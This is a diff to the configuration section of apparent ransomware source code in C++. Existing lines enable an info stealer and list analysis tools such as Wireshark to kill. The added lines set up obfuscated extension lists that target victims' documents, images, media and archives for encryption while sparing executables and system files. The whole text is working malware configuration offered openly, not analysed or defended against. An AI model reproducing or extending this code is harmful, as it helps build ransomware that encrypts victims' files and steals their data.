@@ -44,6 +44,8 @@
 #define DELETE_RESTOREPOINT false	// enable or disable restore points deleter
 #define CHANGE_FILE_ICON	false	// enable or disable custom icon for crypted files
 #define STEAL_INFO			true	// enable or disable info stealer
+#define ENABLE_BLACKLIST	true	// enable or disable blacklist for file extension
+#define ENABLE_WHITELIST	true	// enable or disable whitelist for file extension
 #define DROP_README			false	// enable or disable README dropper
 #define DROP_DECRYPTOR		false	// enable or disable Decryptor dropper
 #define CHANGE_WALLPAPER	false	// enable or disable changer of wallpaper
@@ -92,6 +94,41 @@ const std::string badPrograms[] = {
 	(std::string)skCrypt("Wireshark"),
 	(std::string)skCrypt("decompile")
 }; // tasks to kill
+
+const std::string blacklist[] = {
+	(std::string)skCrypt("exe"),
+	(std::string)skCrypt("dll"),
+	(std::string)skCrypt("ini"),
+	(std::string)skCrypt("dat"),
+	(std::string)skCrypt("cfg")
+}; // extension of files to not encrypt
+
+const std::string whitelist[] = {
+	(std::string)skCrypt("jpg"),
+	(std::string)skCrypt("jpeg"),
+	(std::string)skCrypt("pdf"),
+	(std::string)skCrypt("png"),
+	(std::string)skCrypt("txt"),
+	(std::string)skCrypt("odt"),
+	(std::string)skCrypt("xls"),
+	(std::string)skCrypt("xlsx"),
+	(std::string)skCrypt("ods"),
+	(std::string)skCrypt("ppt"),
+	(std::string)skCrypt("pptx"),
+	(std::string)skCrypt("htm"),
+	(std::string)skCrypt("html"),
+	(std::string)skCrypt("mp3"),
+	(std::string)skCrypt("wma"),
+	(std::string)skCrypt("avi"),
+	(std::string)skCrypt("mov"),
+	(std::string)skCrypt("mp4"),
+	(std::string)skCrypt("gif"),
+	(std::string)skCrypt("svg"),
+	(std::string)skCrypt("ai"),
+	(std::string)skCrypt("zip"),
+	(std::string)skCrypt("rar"),
+	(std::string)skCrypt("7z")
+}; // extension of files to encrypt
 
 
 
